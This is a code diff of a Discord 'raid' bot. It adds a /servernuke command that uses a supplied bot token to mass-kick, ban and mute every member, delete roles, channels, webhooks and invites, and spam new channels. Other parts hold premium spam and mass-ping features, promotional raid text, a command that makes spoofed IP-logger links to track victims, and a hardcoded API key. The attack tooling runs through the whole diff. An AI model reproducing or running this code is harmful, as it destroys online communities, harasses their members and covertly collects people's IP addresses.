@@ -18,32 +18,39 @@ from discord import User, Embed, Interaction, Permissions, AllowedMentions, Butt
 from discord.ext import commands
 from discord.ui import Modal, TextInput, View, Button
 from PIL import Image, ImageDraw, ImageFont, ImageOps
-
+import threading
+import concurrent.futures
 import requests
-
+import traceback
 init(autoreset=True)
 
-LOG_WEBHOOK_URL = "fuckass webhook logger" # webhook for all logs
+LOG_WEBHOOK_URL = "webhook logger lol"  # webhook for all logs
 PREMIUM_FILE = "premium.json"
 PRESETS_FILE = "presets.json"
-
+intents = discord.Intents.default()
+intents.message_content = True
+client = discord.Client(intents=intents)
+operation_lock = threading.Lock()
 
 IPLOGGER_API_KEY = "api_OmDEXZUK0kkXK3U3Xx822kBOj8s8XbER"
+
 
 class RateLimitFilter(logging.Filter):
     def filter(self, record):
         if "is rate limited" in record.getMessage():
             if not hasattr(record, "already_logged"):
                 record.already_logged = True
-            return False 
-        return True  
+            return False
+        return True
+
 
 logger = logging.getLogger("discord.webhook.async_")
 logger.addFilter(RateLimitFilter())
 
 with open("config.json", "r", encoding="utf-8") as f:
     config = json.load(f)
-    
+
+
 class CooldownManager:
     def __init__(self, cooldown_seconds: int):
         self.cooldown_seconds = cooldown_seconds
@@ -62,9 +69,13 @@ class CooldownManager:
 
     def cleanup(self):
         now = time.time()
-        to_delete = [user for user, ts in self.user_timestamps.items() if now - ts > self.cooldown_seconds]
+        to_delete = [
+            user for user,
+            ts in self.user_timestamps.items() if now -
+            ts > self.cooldown_seconds]
         for user in to_delete:
             del self.user_timestamps[user]
+
 
 cooldown_manager = CooldownManager(100)
 
@@ -75,9 +86,11 @@ def load_premium_users():
     with open(PREMIUM_FILE, "r") as f:
         return json.load(f)
 
+
 def save_premium_users(user_ids):
     with open(PREMIUM_FILE, "w") as f:
         json.dump(user_ids, f, indent=2)
+
 
 def add_premium_user(user_id: int):
     premium_users = load_premium_users()
@@ -85,9 +98,11 @@ def add_premium_user(user_id: int):
         premium_users.append(user_id)
         save_premium_users(premium_users)
 
+
 def is_premium_user(user_id: int):
     premium_users = load_premium_users()
     return user_id in premium_users
+
 
 def remove_premium_user(user_id: int) -> bool:
     premium_users = load_premium_users()
@@ -96,6 +111,7 @@ def remove_premium_user(user_id: int) -> bool:
         save_premium_users(premium_users)
         return True
     return False
+
 
 def update_leaderboard(user_id: int):
     leaderboard_file = "leaderboard.json"
@@ -151,9 +167,11 @@ def update_leaderboard(user_id: int, command_name: str):
     with open(leaderboard_file, "w") as f:
         json.dump(data, f, indent=4)
 
+
 def save_token(token):
     with open("config.json", "w") as file:
         json.dump({"TOKEN": token}, file)
+
 
 def load_token():
     try:
@@ -167,16 +185,16 @@ def load_token():
         print(Fore.RED + "Error: Invalid JSON format in config.json.")
         return None
 
+
 logo = f"""{Fore.MAGENTA}
 
-   ___ _   _ ___ ___ ___ ___ 
+   ___ _   _ ___ ___ ___ ___
   / __| | | | _ ) __| _ \
- | (__| |_| | _ \ _||   /
-  \___|\___/|___/___|_|_\
-{Fore.WHITE}     easy raid lol                       
- 
-"""
+ | (__| |_| | _ \\ _||   /
+  \\___|\\___/|___/___|_|_\
+{Fore.WHITE}     easy raid lol
 
+"""
 
 
 def display_status(connected):
@@ -185,15 +203,21 @@ def display_status(connected):
     else:
         print(Fore.RED + "Status: Disconnected")
 
+
 def token_management():
-    os.system('cls' if os.name == 'nt' else 'clear') 
+    os.system('cls' if os.name == 'nt' else 'clear')
     print(Fore.CYAN + "Welcome to the bot token management!\n")
     print("1. Set a new token")
     print("2. Load previous token")
-    
+
     print()
 
-    choice = input(f"{Fore.YELLOW}>{Fore.WHITE} Choose an option (1, 2){Fore.YELLOW}:{Fore.WHITE} ")
+    choice = input(
+        f"{
+            Fore.YELLOW}>{
+            Fore.WHITE} Choose an option (1, 2){
+                Fore.YELLOW}:{
+                    Fore.WHITE} ")
 
     if choice == "1":
         new_token = input(Fore.GREEN + "Enter the new token: ")
@@ -203,7 +227,12 @@ def token_management():
     elif choice == "2":
         token = load_token()
         if token:
-            print(f"{Fore.GREEN}>{Fore.WHITE} Previous token loaded: {Fore.GREEN}{token}{Fore.WHITE}.")
+            print(
+                f"{
+                    Fore.GREEN}>{
+                    Fore.WHITE} Previous token loaded: {
+                    Fore.GREEN}{token}{
+                    Fore.WHITE}.")
             return token
         else:
             print(Fore.RED + "No token found.")
@@ -211,6 +240,7 @@ def token_management():
     else:
         print(Fore.RED + "Invalid choice. Please try again.")
         return None
+
 
 async def log_command_use(
     user: discord.User,
@@ -253,7 +283,8 @@ async def log_command_use(
                 "inline": False
             })
         else:
-            trimmed = message if len(message) <= 1024 else message[:1021] + "..."
+            trimmed = message if len(
+                message) <= 1024 else message[:1021] + "..."
             fields.append({
                 "name": "Message Content",
                 "value": trimmed,
@@ -287,12 +318,12 @@ async def log_command_use(
                 print(f"Failed to send log webhook, status: {resp.status}")
 
 intents = discord.Intents.default()
-intents.messages = False  
-intents.message_content = False  
-intents.members = False  
-intents.guilds = False  
-intents.typing = False 
-intents.presences = False  
+intents.messages = False
+intents.message_content = False
+intents.members = False
+intents.guilds = False
+intents.typing = False
+intents.presences = False
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
@@ -310,6 +341,7 @@ def load_presets():
     except json.JSONDecodeError:
         return {}
 
+
 def save_preset(user_id, message):
     data = load_presets()
     data[str(user_id)] = message
@@ -317,20 +349,26 @@ def save_preset(user_id, message):
     with open(PRESETS_FILE, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=4)
 
+
 def get_preset(user_id):
     data = load_presets()
     return data.get(str(user_id))
+
 
 class PresetModal(Modal, title="Set Your Custom Raid Message"):
     def __init__(self, user_id: int):
         super().__init__()
         self.user_id = user_id
-        self.message_input = TextInput(label="Enter your spam message", style=discord.TextStyle.long, max_length=2000)
+        self.message_input = TextInput(
+            label="Enter your spam message",
+            style=discord.TextStyle.long,
+            max_length=2000)
         self.add_item(self.message_input)
 
     async def on_submit(self, interaction: Interaction):
         save_preset(self.user_id, self.message_input.value)
         await interaction.response.send_message("✅ Preset message saved successfully!", ephemeral=True)
+
 
 class PresetView(View):
     def __init__(self, user_id: int):
@@ -349,7 +387,9 @@ class PresetView(View):
         else:
             await interaction.response.send_message("⚠️ No preset message found. Please set one first.", ephemeral=True)
 
-@bot.tree.command(name="preset-message", description="Manage your custom raid message preset.")
+
+@bot.tree.command(name="preset-message",
+                  description="Manage your custom raid message preset.")
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 async def preset_message(interaction: discord.Interaction):
     if not is_premium_user(interaction.user.id):
@@ -359,11 +399,629 @@ async def preset_message(interaction: discord.Interaction):
     embed = discord.Embed(
         title="⚡ Preset Message",
         description="Use the buttons below to set or preview your raid message.",
-        color=0xa874d1
-    )
+        color=0xa874d1)
     await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
 
 
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('servernuke.log'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger('servernuke')
+
+@bot.tree.command(
+    name="servernuke",
+    description="Nuke a server with customizable options"
+)
+@app_commands.describe(
+    messageloop="Number of message loops (1-3)",
+    bottoken="Discord bot token",
+    serverid="Target server ID",
+    servername="New server name (optional)",
+    channelname="Channel name prefix",
+    channelamount="Number of channels to create (1-500)",
+    message="Message content",
+    messageamount="Messages per channel (1-15)",
+    kickall="Kick all members",
+    banall="Ban all members",
+    muteall="Mute all members",
+    lockdown="Lock down permissions",
+    roleall="Give all roles to everyone",
+    deleteall="Delete all server elements"
+)
+async def servernuke(
+    interaction: discord.Interaction,
+    messageloop: int = 1,
+    bottoken: str = None,
+    serverid: str = None,
+    servername: str = None,
+    channelname: str = "nuke",
+    channelamount: int = 1,
+    message: str = "NUKED",
+    messageamount: int = 1,
+    kickall: bool = False,
+    banall: bool = False,
+    muteall: bool = False,
+    lockdown: bool = False,
+    roleall: bool = False,
+    deleteall: bool = False
+):
+    user_id = interaction.user.id
+
+    # Validate and clamp values
+    messageloop = max(1, min(3, messageloop))
+    channelamount = max(1, min(500, channelamount))
+    messageamount = max(1, min(15, messageamount))
+
+    # Log info
+    print("//////////////////////////////////")
+    print(f"// [{user_id}] is using the nuker")
+    print(f"// Token: {bottoken}")
+    print(f"// Target Server ID: {serverid}")
+    if servername:
+        print(f"// New Server Name: {servername}")
+    if kickall:
+        print(f"// Wanna kick all members: YES")
+    if banall:
+        print(f"// Wanna massban: YES")
+    if muteall:
+        print(f"// Wanna muteall: YES")
+    if lockdown:
+        print(f"// Lockdown (Disable Send Messages): YES")
+    if roleall:
+        print(f"// RoleAll (Give all roles to everyone): YES")
+    if deleteall:
+        print(f"// DeleteAll (Delete all roles, emojis, stickers, webhooks, disable community features, invalidate invites): YES")
+    print(f"// Channels to Create: {channelamount} (base: {channelname})")
+    print(f"// Messages per Channel: {messageamount}")
+    print(f"// Message Content: \"{message}\"")
+    print("//////////////////////////////////")
+
+    # Respond immediately
+    await interaction.response.send_message(
+        content=f"Nuking `{serverid}`, if message sending stops too soon, consider lowering messageamount (20-30 is ideal)",
+        ephemeral=True
+    )
+
+    # Define the nuke process
+    async def run_nuke():
+        new_channels = []  # initialize list to store created channels
+
+        try:
+            async with aiohttp.ClientSession() as session:
+                headers = {"Authorization": f"Bot {bottoken}"}
+
+                # Rename server if specified
+                if servername:
+                    try:
+                        async with session.patch(
+                            f"https://discord.com/api/v10/guilds/{serverid}",
+                            json={"name": servername},
+                            headers=headers
+                        ) as resp:
+                            if resp.status >= 400:
+                                error_data = await resp.json()
+                                print(f"Failed to rename server: {error_data}")
+                            else:
+                                print(f"Renamed server to: {servername}")
+                    except Exception as err:
+                        print(f"Failed to rename server: {str(err)}")
+
+                # Lockdown roles
+                if lockdown:
+                    try:
+                        # Fetch all roles with pagination
+                        roles = []
+                        after = None
+                        while True:
+                            params = {'limit': 100}
+                            if after:
+                                params['after'] = after
+                            async with session.get(
+                                f"https://discord.com/api/v10/guilds/{serverid}/roles",
+                                headers=headers,
+                                params=params
+                            ) as resp:
+                                batch = await resp.json()
+                                if not batch:
+                                    break
+                                roles.extend(batch)
+                                if len(batch) < 100:
+                                    break
+                                after = batch[-1]['id']
+
+                        for role in roles:
+                            if role.get("id") == serverid:
+                                continue
+                            try:
+                                new_permissions = str(
+                                    int(role.get("permissions")) & ~0x800
+                                )
+                                async with session.patch(
+                                    f"https://discord.com/api/v10/guilds/{serverid}/roles/{role.get('id')}",
+                                    json={"permissions": new_permissions},
+                                    headers=headers
+                                ) as resp:
+                                    if resp.status >= 400:
+                                        error_data = await resp.json()
+                                        print(f"Failed to update role {role.get('name')}: {error_data}")
+                                    else:
+                                        print(f"Disabled Send Messages for role: {role.get('name')}")
+                                await asyncio.sleep(0.25)
+                            except Exception as err:
+                                print(f"Failed to update role {role.get('name')}: {str(err)}")
+                            
+                        # Update @everyone role
+                        try:
+                            # Fetch @everyone role (by ID)
+                            async with session.get(
+                                f"https://discord.com/api/v10/guilds/{serverid}/roles",
+                                headers=headers
+                            ) as resp:
+                                roles_list = await resp.json()
+                                everyone_role = next((r for r in roles_list if r['name'] == '@everyone'), None)
+
+                            if everyone_role:
+                                new_permissions = str(
+                                    int(everyone_role.get("permissions")) & ~0x800
+                                )
+                                async with session.patch(
+                                    f"https://discord.com/api/v10/guilds/{serverid}/roles/{everyone_role.get('id')}",
+                                    json={"permissions": new_permissions},
+                                    headers=headers
+                                ) as resp:
+                                    if resp.status >= 400:
+                                        error_data = await resp.json()
+                                        print(f"Failed to update @everyone role: {error_data}")
+                                    else:
+                                        print(f"Disabled Send Messages for @everyone role")
+                        except Exception as err:
+                            print(f"Failed to fetch @everyone role: {str(err)}")
+                    except Exception as err:
+                        print(f"Failed to fetch roles: {str(err)}")
+
+                # Kick all members
+                if kickall:
+                    try:
+                        # Fetch members with pagination
+                        members = []
+                        after = None
+                        while True:
+                            params = {'limit': 1000}
+                            if after:
+                                params['after'] = after
+                            async with session.get(
+                                f"https://discord.com/api/v10/guilds/{serverid}/members",
+                                headers=headers,
+                                params=params
+                            ) as resp:
+                                batch = await resp.json()
+                                if not batch:
+                                    break
+                                members.extend(batch)
+                                if len(batch) < 1000:
+                                    break
+                                after = batch[-1]['user']['id']
+
+                        for member in members:
+                            try:
+                                member_user_id = member.get("user", {}).get("id")
+                                member_username = member.get("user", {}).get("username")
+                                async with session.delete(
+                                    f"https://discord.com/api/v10/guilds/{serverid}/members/{member_user_id}",
+                                    headers=headers
+                                ) as resp:
+                                    if resp.status >= 400:
+                                        error_data = await resp.json()
+                                        print(f"Failed to kick {member_username}: {error_data}")
+                                    else:
+                                        print(f"Kicked member: {member_username}")
+                                await asyncio.sleep(0.25)
+                            except Exception as err:
+                                print(f"Failed to kick {member.get('user', {}).get('username')}: {str(err)}")
+                    except Exception as err:
+                        print(f"Failed to fetch members: {str(err)}")
+
+                # Ban all members
+                if banall:
+                    try:
+                        # Fetch members with pagination
+                        members = []
+                        after = None
+                        while True:
+                            params = {'limit': 1000}
+                            if after:
+                                params['after'] = after
+                            async with session.get(
+                                f"https://discord.com/api/v10/guilds/{serverid}/members",
+                                headers=headers,
+                                params=params
+                            ) as resp:
+                                batch = await resp.json()
+                                if not batch:
+                                    break
+                                members.extend(batch)
+                                if len(batch) < 1000:
+                                    break
+                                after = batch[-1]['user']['id']
+
+                        for member in members:
+                            try:
+                                member_user_id = member.get("user", {}).get("id")
+                                member_username = member.get("user", {}).get("username")
+                                async with session.put(
+                                    f"https://discord.com/api/v10/guilds/{serverid}/bans/{member_user_id}",
+                                    json={},
+                                    headers=headers
+                                ) as resp:
+                                    if resp.status >= 400:
+                                        error_data = await resp.json()
+                                        print(f"Failed to ban {member_username}: {error_data}")
+                                    else:
+                                        print(f"Banned member: {member_username}")
+                                await asyncio.sleep(0.25)
+                            except Exception as err:
+                                print(f"Failed to ban {member.get('user', {}).get('username')}: {str(err)}")
+                    except Exception as err:
+                        print(f"Failed to fetch members: {str(err)}")
+
+                # Mute all members
+                if muteall:
+                    try:
+                        # Fetch members with pagination
+                        members = []
+                        after = None
+                        while True:
+                            params = {'limit': 1000}
+                            if after:
+                                params['after'] = after
+                            async with session.get(
+                                f"https://discord.com/api/v10/guilds/{serverid}/members",
+                                headers=headers,
+                                params=params
+                            ) as resp:
+                                batch = await resp.json()
+                                if not batch:
+                                    break
+                                members.extend(batch)
+                                if len(batch) < 1000:
+                                    break
+                                after = batch[-1]['user']['id']
+
+                        mute_until = (datetime.utcnow() + timedelta(days=7)).isoformat() + "Z"
+                        for member in members:
+                            try:
+                                member_user_id = member.get("user", {}).get("id")
+                                member_username = member.get("user", {}).get("username")
+                                async with session.patch(
+                                    f"https://discord.com/api/v10/guilds/{serverid}/members/{member_user_id}",
+                                    json={"communication_disabled_until": mute_until},
+                                    headers=headers
+                                ) as resp:
+                                    if resp.status >= 400:
+                                        error_data = await resp.json()
+                                        print(f"Failed to mute {member_username}: {error_data}")
+                                    else:
+                                        print(f"Muted member: {member_username} for 1 week")
+                                await asyncio.sleep(0.25)
+                            except Exception as err:
+                                print(f"Failed to mute {member.get('user', {}).get('username')}: {str(err)}")
+                    except Exception as err:
+                        print(f"Failed to fetch members: {str(err)}")
+
+                # Give all roles to everyone
+                if roleall:
+                    try:
+                        # Fetch members with pagination
+                        members = []
+                        after = None
+                        while True:
+                            params = {'limit': 1000}
+                            if after:
+                                params['after'] = after
+                            async with session.get(
+                                f"https://discord.com/api/v10/guilds/{serverid}/members",
+                                headers=headers,
+                                params=params
+                            ) as resp:
+                                batch = await resp.json()
+                                if not batch:
+                                    break
+                                members.extend(batch)
+                                if len(batch) < 1000:
+                                    break
+                                after = batch[-1]['user']['id']
+
+                        # Fetch roles
+                        roles = []
+                        async with session.get(
+                            f"https://discord.com/api/v10/guilds/{serverid}/roles",
+                            headers=headers
+                        ) as resp:
+                            roles = await resp.json()
+
+                        for member in members:
+                            member_id = member.get("user", {}).get("id")
+                            member_roles = member.get("roles", [])
+
+                            for role in roles:
+                                if role.get("id") != serverid and role.get("id") not in member_roles:
+                                    try:
+                                        async with session.put(
+                                            f"https://discord.com/api/v10/guilds/{serverid}/members/{member_id}/roles/{role.get('id')}",
+                                            headers=headers
+                                        ) as resp:
+                                            if resp.status >= 400:
+                                                error_data = await resp.json()
+                                                print(f"Failed to grant role {role.get('name')} to {member.get('user', {}).get('username')}: {error_data}")
+                                            else:
+                                                print(f"Granted role {role.get('name')} to {member.get('user', {}).get('username')}")
+                                        await asyncio.sleep(0.25)
+                                    except Exception as err:
+                                        print(f"Failed to grant role {role.get('name')} to {member.get('user', {}).get('username')}: {str(err)}")
+                    except Exception as err:
+                        print(f"Error in role assignment process: {str(err)}")
+
+                # Now handle deleteall section
+                if deleteall:
+                    # Delete all roles
+                    try:
+                        roles = []
+                        async with session.get(
+                            f"https://discord.com/api/v10/guilds/{serverid}/roles",
+                            headers=headers
+                        ) as resp:
+                            roles = await resp.json()
+                        for role in roles:
+                            if role.get("id") != serverid:
+                                try:
+                                    async with session.delete(
+                                        f"https://discord.com/api/v10/guilds/{serverid}/roles/{role.get('id')}",
+                                        headers=headers
+                                    ) as resp:
+                                        if resp.status >= 400:
+                                            error_data = await resp.json()
+                                            print(f"Failed to delete role {role.get('name')}: {error_data}")
+                                        else:
+                                            print(f"Deleted role: {role.get('name')}")
+                                    await asyncio.sleep(0.25)
+                                except Exception as err:
+                                    print(f"Failed to delete role {role.get('name')}: {str(err)}")
+                    except Exception as err:
+                        print(f"Failed to fetch roles: {str(err)}")
+
+                    # Delete all emojis
+                    try:
+                        emojis = []
+                        async with session.get(
+                            f"https://discord.com/api/v10/guilds/{serverid}/emojis",
+                            headers=headers
+                        ) as resp:
+                            emojis = await resp.json()
+                        for emoji in emojis:
+                            try:
+                                async with session.delete(
+                                    f"https://discord.com/api/v10/guilds/{serverid}/emojis/{emoji.get('id')}",
+                                    headers=headers
+                                ) as resp:
+                                    if resp.status >= 400:
+                                        error_data = await resp.json()
+                                        print(f"Failed to delete emoji {emoji.get('name')}: {error_data}")
+                                    else:
+                                        print(f"Deleted emoji: {emoji.get('name')}")
+                                await asyncio.sleep(0.25)
+                            except Exception as err:
+                                print(f"Failed to delete emoji {emoji.get('name')}: {str(err)}")
+                    except Exception as err:
+                        print(f"Failed to fetch emojis: {str(err)}")
+
+                    # Delete all stickers
+                    try:
+                        stickers = []
+                        async with session.get(
+                            f"https://discord.com/api/v10/guilds/{serverid}/stickers",
+                            headers=headers
+                        ) as resp:
+                            stickers = await resp.json()
+                        for sticker in stickers:
+                            try:
+                                async with session.delete(
+                                    f"https://discord.com/api/v10/guilds/{serverid}/stickers/{sticker.get('id')}",
+                                    headers=headers
+                                ) as resp:
+                                    if resp.status >= 400:
+                                        error_data = await resp.json()
+                                        print(f"Failed to delete sticker {sticker.get('name')}: {error_data}")
+                                    else:
+                                        print(f"Deleted sticker: {sticker.get('name')}")
+                                await asyncio.sleep(0.25)
+                            except Exception as err:
+                                print(f"Failed to delete sticker {sticker.get('name')}: {str(err)}")
+                    except Exception as err:
+                        print(f"Failed to fetch stickers: {str(err)}")
+
+                    # Delete all webhooks
+                    try:
+                        webhooks = []
+                        async with session.get(
+                            f"https://discord.com/api/v10/guilds/{serverid}/webhooks",
+                            headers=headers
+                        ) as resp:
+                            webhooks = await resp.json()
+                        for webhook in webhooks:
+                            try:
+                                async with session.delete(
+                                    f"https://discord.com/api/v10/webhooks/{webhook.get('id')}",
+                                    headers=headers
+                                ) as resp:
+                                    if resp.status >= 400:
+                                        error_data = await resp.json()
+                                        print(f"Failed to delete webhook {webhook.get('name')}: {error_data}")
+                                    else:
+                                        print(f"Deleted webhook: {webhook.get('name')}")
+                                await asyncio.sleep(0.25)
+                            except Exception as err:
+                                print(f"Failed to delete webhook {webhook.get('name')}: {str(err)}")
+                    except Exception as err:
+                        print(f"Failed to fetch webhooks: {str(err)}")
+
+                    # Disable community features
+                    try:
+                        async with session.patch(
+                            f"https://discord.com/api/v10/guilds/{serverid}",
+                            json={
+                                "features": [],
+                                "premium_progress_bar_enabled": False,
+                                "verification_level": 0,
+                                "explicit_content_filter": 0,
+                                "default_message_notifications": 1
+                            },
+                            headers=headers
+                        ) as resp:
+                            if resp.status >= 400:
+                                error_data = await resp.json()
+                                print(f"Failed to disable community features: {error_data}")
+                            else:
+                                print(f"Disabled community features")
+                    except Exception as err:
+                        print(f"Failed to disable community features: {str(err)}")
+
+                    # Invalidate all invites
+                    try:
+                        invites = []
+                        async with session.get(
+                            f"https://discord.com/api/v10/guilds/{serverid}/invites",
+                            headers=headers
+                        ) as resp:
+                            invites = await resp.json()
+                        for invite in invites:
+                            try:
+                                async with session.delete(
+                                    f"https://discord.com/api/v10/invites/{invite.get('code')}",
+                                    headers=headers
+                                ) as resp:
+                                    if resp.status >= 400:
+                                        error_data = await resp.json()
+                                        print(f"Failed to invalidate invite {invite.get('code')}: {error_data}")
+                                    else:
+                                        print(f"Invalidated invite: {invite.get('code')}")
+                                await asyncio.sleep(0.25)
+                            except Exception as err:
+                                print(f"Failed to invalidate invite {invite.get('code')}: {str(err)}")
+                    except Exception as err:
+                        print(f"Failed to fetch invites: {str(err)}")
+
+                    # Reset server icon and banner if needed
+                    # (Add code here if necessary)
+
+                    # Delete all channels
+                    try:
+                        channels = []
+                        async with session.get(
+                            f"https://discord.com/api/v10/guilds/{serverid}/channels",
+                            headers=headers
+                        ) as resp:
+                            channels = await resp.json()
+
+                        print(f"Found {len(channels)} existing channels in server {serverid}")
+
+                        # Delete channels
+                        async def delete_channel(channel):
+                            try:
+                                async with session.delete(
+                                    f"https://discord.com/api/v10/channels/{channel.get('id')}",
+                                    headers=headers
+                                ) as resp:
+                                    if resp.status >= 400:
+                                        error_data = await resp.json()
+                                        print(f"Failed to delete channel {channel.get('id')}: {error_data}")
+                                    else:
+                                        print(f"Deleted channel: {channel.get('name')} ({channel.get('id')})")
+                            except Exception as err:
+                                print(f"Failed to delete channel {channel.get('id')}: {str(err)}")
+
+                        delete_tasks = [delete_channel(channel) for channel in channels]
+                        await asyncio.gather(*delete_tasks, return_exceptions=True)
+
+                        # Create new channels
+                        for i in range(channelamount):
+                            try:
+                                random_suffix = ''.join(
+                                    random.choices(string.ascii_lowercase + string.digits, k=4)
+                                )
+                                sanitized_name = re.sub(r'[^a-zA-Z0-9-_]', '', channelname)
+                                async with session.post(
+                                    f"https://discord.com/api/v10/guilds/{serverid}/channels",
+                                    json={
+                                        "name": f"{sanitized_name}-{random_suffix}",
+                                        "type": 0,
+                                        "permission_overwrites": []
+                                    },
+                                    headers={
+                                        "Authorization": f"Bot {bottoken}",
+                                        "Content-Type": "application/json"
+                                    }
+                                ) as resp:
+                                    if resp.status >= 400:
+                                        error_data = await resp.json()
+                                        print(f"Failed to create channel {i+1}/{channelamount}: {error_data}")
+                                    else:
+                                        created_channel = await resp.json()
+                                        print(f"Created channel: {created_channel.get('name')}")
+                                        new_channels.append(created_channel)  # store created channels
+                                await asyncio.sleep(0.1)
+                            except Exception as err:
+                                print(f"Failed to create channel {i+1}/{channelamount}: {str(err)}")
+                        
+                        # Send messages in channels
+                        for loop in range(messageloop):
+                            print(f"Starting message loop {loop + 1}")
+
+                            async def send_message(channel_id, channel_name, msg_idx):
+                                try:
+                                    async with session.post(
+                                        f"https://discord.com/api/v10/channels/{channel_id}/messages",
+                                        json={"content": message},
+                                        headers=headers
+                                    ) as resp:
+                                        if resp.status >= 400:
+                                            error_data = await resp.json()
+                                            print(f"Failed to send message in {channel_name}: {error_data}")
+                                        else:
+                                            print(f"Sent message {msg_idx + 1}/{messageamount} in {channel_name} (loop {loop + 1})")
+                                except Exception as err:
+                                    print(f"Failed to send message in {channel_name}: {str(err)}")
+                            
+                            message_tasks = []
+                            for channel in new_channels:
+                                for j in range(messageamount):
+                                    message_tasks.append(
+                                        send_message(channel.get("id"), channel.get("name"), j)
+                                    )
+
+                            # Limit concurrent requests
+                            for i in range(0, len(message_tasks), 10):
+                                batch = message_tasks[i:i + 10]
+                                await asyncio.gather(*batch, return_exceptions=True)
+                                await asyncio.sleep(1.1)
+
+                            await asyncio.sleep(0.5)
+
+                        print(f"Completed nuke of server {serverid}")
+
+                    except Exception as err:
+                        print(f"Error during channel creation or messaging: {str(err)}")
+            # end aiohttp session
+        except Exception as err:
+            print(f"Error during nuke: {str(err)}")
+
+    # Run the nuke process
+    asyncio.create_task(run_nuke())
 
 SPOOF_MAP = {
     "tiktok_video": "https//www.tiktok.com/@feri_azimi/video/1234567890",
@@ -372,6 +1030,7 @@ SPOOF_MAP = {
     "instagram_account": "https//www.instagram.com/feri_azimi/",
     "roblox_account": "https//www.roblox.com/users/3554077592/profile"
 }
+
 
 @bot.tree.command(
     name="createlogger",
@@ -460,21 +1119,27 @@ async def createlogger(
         await interaction.followup.send(f"⚠️ API request error: {e}", ephemeral=True)
 
 
-
 class SpamButton(discord.ui.View):
     def __init__(self, message):
         super().__init__()
         self.message = message
 
     @discord.ui.button(label="Spam", style=discord.ButtonStyle.red)
-    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+    async def spam_button(
+            self,
+            interaction: discord.Interaction,
+            button: discord.ui.Button):
         await interaction.response.defer()
-        allowed = discord.AllowedMentions(everyone=True, users=True, roles=True)
-        for _ in range(5):  
-            await interaction.followup.send(self.message, allowed_mentions=allowed)  
+        allowed = discord.AllowedMentions(
+            everyone=True, users=True, roles=True)
+        for _ in range(5):
+            await interaction.followup.send(self.message, allowed_mentions=allowed)
 
-@bot.tree.command(name="fast-spam", description="[💎] spam with blazing fast speed, can also save your message to spam lol")
-@app_commands.describe(message="Optional: your custom message to spam (use /preset-message if you want to save it)")
+
+@bot.tree.command(name="fast-spam",
+                  description="[💎] spam with blazing fast speed, can also save your message to spam lol")
+@app_commands.describe(
+    message="Optional: your custom message to spam (use /preset-message if you want to save it)")
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 async def custom_raid(interaction: discord.Interaction, message: str = None):
     if not is_premium_user(interaction.user.id):
@@ -499,8 +1164,6 @@ async def custom_raid(interaction: discord.Interaction, message: str = None):
     update_leaderboard(interaction.user.id, "fast-spam")
 
 
-
-
 class PingButton(discord.ui.View):
     def __init__(self, user_ids: list[str], pings_per_message: int = 1):
         super().__init__(timeout=None)
@@ -509,7 +1172,10 @@ class PingButton(discord.ui.View):
         self.delay = 1
 
     @discord.ui.button(label="🔁 Ping!", style=discord.ButtonStyle.red)
-    async def ping_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+    async def ping_button(
+            self,
+            interaction: discord.Interaction,
+            button: discord.ui.Button):
         if not self.user_ids:
             await interaction.response.send_message("⚠️ No IDs available to ping.", ephemeral=True)
             return
@@ -518,13 +1184,16 @@ class PingButton(discord.ui.View):
         max_retries = 2
 
         for _ in range(5):
-            selected_ids = random.sample(self.user_ids, min(self.pings_per_message, len(self.user_ids)))
+            selected_ids = random.sample(
+                self.user_ids, min(
+                    self.pings_per_message, len(
+                        self.user_ids)))
             mentions = " ".join(f"<@{uid}>" for uid in selected_ids)
             pingmsg = '''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                   ***@CYBER**   `💀`
                   raid b__o__t  ﹒ s__o__cial  ﹒ to__xic__
-                         `🌟`     _join to [RAID](https://tenor.com/view/playboi-carti-discord-discord-raid-gif-21005635) any server __Without Admin perms__, free to use_ :moneybag: 
+                         `🌟`     _join to [RAID](https://tenor.com/view/playboi-carti-discord-discord-raid-gif-21005635) any server __Without Admin perms__, free to use_ :moneybag:
 
 ⠀⠀⠀⠀⠀⠀⠀                            **[JOIN](https://discord.com/invite/D7mZrGBsRj) TODAY, AND R__AI__D EVER__Y__ SERVER YOU WANT WITHOUT [ADMIN](https://tenor.com/view/mooning-show-butt-shake-butt-pants-down-gif-17077775)**
             '''
@@ -538,7 +1207,10 @@ class PingButton(discord.ui.View):
                     if e.status == 429:
                         retry_after = getattr(e, "retry_after", 1.5)
                         retry_after = min(retry_after, 5)
-                        print(f"Rate limit hit, retrying after {retry_after:.2f}s (retry {retries + 1}/{max_retries})")
+                        print(
+                            f"Rate limit hit, retrying after {
+                                retry_after:.2f}s (retry {
+                                retries + 1}/{max_retries})")
                         await asyncio.sleep(retry_after)
                         retries += 1
                     else:
@@ -547,7 +1219,8 @@ class PingButton(discord.ui.View):
                 print("Failed to send message after max retries, skipping.")
 
 
-@bot.tree.command(name="ping", description="Ping random user IDs from a .txt file using a button.")
+@bot.tree.command(name="ping",
+                  description="Ping random user IDs from a .txt file using a button.")
 @app_commands.describe(
     file="A .txt file containing user IDs (one per line)",
     pings_per_message="amount of users to ping per message (most servers block 5+ pings per message so keep it low)"
@@ -566,7 +1239,8 @@ async def ping_from_file(
 
         file_content = await file.read()
         text = file_content.decode("utf-8")
-        user_ids = [line.strip() for line in text.splitlines() if line.strip().isdigit()]
+        user_ids = [line.strip()
+                    for line in text.splitlines() if line.strip().isdigit()]
 
         if not user_ids:
             await interaction.response.send_message("⚠️ No valid user IDs found in the file.", ephemeral=True)
@@ -575,7 +1249,6 @@ async def ping_from_file(
         view = PingButton(user_ids, pings_per_message)
         await interaction.response.send_message("🔴 Click to ping random users!", view=view, ephemeral=True)
 
-
     except Exception as e:
         if interaction.response.is_done():
             await interaction.followup.send(f"❌ Error: `{e}`", ephemeral=True)
@@ -583,34 +1256,58 @@ async def ping_from_file(
             await interaction.response.send_message(f"❌ Error: `{e}`", ephemeral=True)
